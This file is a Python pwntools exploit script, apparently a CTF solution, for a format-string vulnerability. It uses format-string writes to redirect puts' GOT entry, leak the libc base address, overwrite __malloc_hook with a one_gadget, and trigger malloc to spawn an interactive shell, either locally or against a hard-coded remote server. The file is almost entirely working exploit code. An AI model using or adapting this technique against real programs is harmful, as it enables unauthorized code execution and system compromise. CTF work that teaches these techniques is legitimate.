#!/usr/bin/env python3
#11-06-2022 Gon
#Format string

#1: write the address of the "vuln" functions into the got address of puts, so the program will not exit.
#2: Leak libc with %3$p
#3: Write __malloc_hook with onegadget
#4 Trigger malloc  with a format placeholder large enough.

from pwn import *

exe = ELF("format_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level='debug'

offset = 6

def conn():
    if args.REMOTE:
        io = remote("107.178.209.165", 9337)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io

def arbwb(addr, byte):
    byte &= 0xFF
    payload = b""
    if byte != 0:
         payload = b"%%%dc" % byte
    payload += b"%8$hhng"
    payload += b"\x00" * (16 - len(payload))
    payload += p64(addr)
    io.sendline(payload)
    io.recvuntil(b'g')

def arbw(addr, int_val):
    print("Writing %x to %x" % (int_val, addr))
    print("BYTE ADDRESS      VALUE") 
    for i in range(8):
        print("%d    %x %x" % (i, addr+i, int_val>>(i*8)))
        arbwb(addr + i, int_val >> (i * 8))

io = conn()

#write vuln into got.puts
payload = fmtstr_payload(offset, {exe.got.puts: exe.sym.vuln})
io.sendlineafter(b'name\n', payload)
io.sendlineafter(b'name\n', b'%3$p')
io.recvuntil(b'name\n')
leak = io.recvuntil(b'\n', drop=True)
libc.address = int(leak.ljust(8, b'\x00'), 16) - libc.sym.__GI___libc_read - 0x11
info("Libc base: %#x", libc.address)

one_gadget = libc.address + 0x4f302
arbw(libc.sym.__malloc_hook, one_gadget)

io.sendlineafter(b'name\n', b'%100000c')
io.interactive()
